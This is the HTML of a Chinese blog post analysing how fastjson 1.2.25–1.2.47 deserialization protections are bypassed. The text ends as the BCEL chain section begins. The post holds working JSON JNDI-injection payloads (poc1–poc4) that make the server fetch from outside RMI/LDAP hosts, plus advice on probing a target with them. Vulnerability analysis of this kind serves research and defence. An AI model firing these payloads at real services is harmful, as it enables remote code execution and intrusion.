@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="fastjson-003">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson 1.2.25-1.2.47漏洞分析">
+<meta property="og:url" content="http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
+<meta property="og:description" content="fastjson-003">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/1.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/2.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/3.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/4.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/5.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/6.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/a.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/8.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/9.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/10.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/11.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/12.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/13.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/14.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/15.png">
+<meta property="article:published_time" content="2022-11-11T06:02:00.000Z">
+<meta property="article:modified_time" content="2022-11-11T08:03:04.802Z">
+<meta property="article:author" content="ninefiger">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ninefiger.top/img/fastjson%201.2.25-1.2.47漏洞分析/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>fastjson 1.2.25-1.2.47漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson 1.2.25-1.2.47漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.25-1.2.47漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">1. 修复分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-checkAutoType%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 checkAutoType方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-autoTypeSupport"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 autoTypeSupport</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%B8%8D%E5%BC%80%E5%90%AFautoTypeSupport%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">2. 不开启autoTypeSupport的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%86%85%E7%BD%AE%E7%9A%84Class%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 内置的Class类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Class%E7%B1%BB%E9%80%9A%E8%BF%87TypeUtils-loadClass%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 Class类通过TypeUtils.loadClass加载类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Poc"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Poc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-JdbcRowSetImpl%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%86%99%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 JdbcRowSetImpl的两个写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2 BCEL利用链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-2-42%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 1.2.42的修复</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        fastjson 1.2.25-1.2.47漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ninefiger</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-11T06:02:00.000Z" itemprop="datePublished">2022-11-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>在1.2.24漏洞分析中，已经有几条利用链了，把版本切换到<code>1.2.25</code>，运行一下<code>poc</code></p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/1.png" alt="1" style="zoom:50%;" /></div>
+
+<h2 id="1-修复分析"><a href="#1-修复分析" class="headerlink" title="1. 修复分析"></a>1. 修复分析</h2><p>poc运行失败了，直接跳转到报错位置分析</p>
+<h3 id="1-1-checkAutoType方法"><a href="#1-1-checkAutoType方法" class="headerlink" title="1.1 checkAutoType方法"></a>1.1 checkAutoType方法</h3><p>a. 调试发现在<code>parseObject</code>方法中，key=<code>@type</code>进行类加载时，发现多了一个<code>checkAutoType</code>方法</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/2.png" alt="2" style="zoom:50%;" /></div>
+
+<p>b. 进入<code>ParseConfig.checkAutoType</code>方法，这里判断了<code>autoTypeSupport</code>是否为<code>false</code>，并进入黑名单判断，黑名单中包括了<code>com.sun</code></p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/3.png" alt="3" style="zoom:50%;" /></div>
+
+<p>所以此时我们的poc在这里就会抛出异常，<code>autoType is not support ...</code></p>
+<h3 id="1-2-autoTypeSupport"><a href="#1-2-autoTypeSupport" class="headerlink" title="1.2 autoTypeSupport"></a>1.2 autoTypeSupport</h3><p>实际上，如果<code>autoTypeSupport</code>一直都是<code>false</code>的，程序会直接抛出异常，哪怕是一个普通的类的反序列化</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/4.png" alt="4" style="zoom:50%;" /></div>
+使用正常的一个测试`User`类测试反序列化
+
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/5.png" alt="5" style="zoom:50%;" /></div>
+### 1.3 开启autoTypeSupport
+这里假设，如果是这个版本，开发需要使用`fastjson`去序列化/反序列化对象，那么手动开启了`autoTypeSupport`属性，此时结合`className`过滤L和;的情况，构造`Lcom.sun.rowset.JdbcRowSetImpl;`来绕过黑名单的过滤
+
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/6.png" alt="6" style="zoom:50%;" /></div>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;rmi://dnslog.cn\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;autoCommit\&quot;: true;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&quot;</span>;</span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parse(poc);</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-不开启autoTypeSupport的绕过"><a href="#2-不开启autoTypeSupport的绕过" class="headerlink" title="2. 不开启autoTypeSupport的绕过"></a>2. 不开启autoTypeSupport的绕过</h2><h3 id="2-1-内置的Class类"><a href="#2-1-内置的Class类" class="headerlink" title="2.1 内置的Class类"></a>2.1 内置的Class类</h3><p><code>CheckAutoType</code>中，可以在默认的解析器Map里找到<code>java.lang.Class</code>这个内置类</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/a.png" alt="a" style="zoom:50%;" /></div>
+
+<p>此时再回到<code>parseObject</code>中，看下<code>java.lang.Class</code>对应的<code>deserializer</code>是什么；<br>调试看到对应的<code>deserializer</code>是<code>MiscCodec</code>，这和<code>java.net.InetAddress</code>一样</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/8.png" alt="8" style="zoom:50%;" /></div>
+
+<p><code>MiscCodec</code>中，当<code>@type</code>对应的是Class类时，返回<code>TypeUtils.loadClass</code></p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/9.png" alt="9" style="zoom:50%;" /></div>
+
+<h3 id="2-2-Class类通过TypeUtils-loadClass加载类"><a href="#2-2-Class类通过TypeUtils-loadClass加载类" class="headerlink" title="2.2 Class类通过TypeUtils.loadClass加载类"></a>2.2 Class类通过TypeUtils.loadClass加载类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此处加载了var参数对应的类，并放到了<code>TypeUtils</code>的<code>mappings</code>中，把我们的目标类添加成了一个内置类，且在加载的过程中并没有对黑名单进行过滤！</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/10.png" alt="10" style="zoom:50%;" /></div>
+
+<p>第二次<code>@type</code>进入<code>checkAutoType</code>，如果没有指定 autoTypeSupport，则通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeUtils.getClassFormMapping(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以直接获取到通过<code>java.lang.Class</code>加载并缓存的<code>com.sun.rowset.JdbcRowSetImpl</code>类</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/11.png" alt="11" style="zoom:50%;" /></div>
+
+<h3 id="2-3-Poc"><a href="#2-3-Poc" class="headerlink" title="2.3 Poc"></a>2.3 Poc</h3><h4 id="2-3-1-JdbcRowSetImpl的两个写法"><a href="#2-3-1-JdbcRowSetImpl的两个写法" class="headerlink" title="2.3.1 JdbcRowSetImpl的两个写法"></a>2.3.1 JdbcRowSetImpl的两个写法</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;:&quot;x&quot;, </span><br><span class="line">	&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>;</span><br><span class="line">	&#125;:&quot;y&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是这里需要注意：如果开发设置了<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，则会直接进入<code>denyList</code>进行检测，<br>因此这里需要整理两个Poc进行检测，防止目标开启了<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">## poc1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span>: <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## poc2  这个poc对应着目标开启 ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">&#123;</span><br><span class="line">  &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;:&quot;x&quot;, </span><br><span class="line">	&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>: <span class="string">&quot;true&quot;</span>;</span><br><span class="line">	&#125;:&quot;y&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## 结合Class的poc也可以自己随意组合，只要保证先使用java.lang.Class加载需要的类即可</span><br><span class="line">##  poc3</span><br><span class="line">&#123;</span><br><span class="line">  &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;:&#123;</span><br><span class="line">  	&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: &quot;true&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## poc4</span><br><span class="line">[</span><br><span class="line">  &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, </span><br><span class="line">  &#123;</span><br><span class="line">  	<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>: <span class="string">&quot;true&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>实际检测利用链时，从</strong><code>poc1、poc3、poc4</code><strong>中选取一个检测一下，如果不行再用</strong><code>poc2</code><strong>检测一下</strong></p>
+<h4 id="2-3-2-BCEL利用链"><a href="#2-3-2-BCEL利用链" class="headerlink" title="2.3.2 BCEL利用链"></a>2.3.2 BCEL利用链</h4><p>此时BCEL利用链仍然是不能用的，我们尝试先试用<code>java.lang.Class</code>去加载必要的两个类</p>
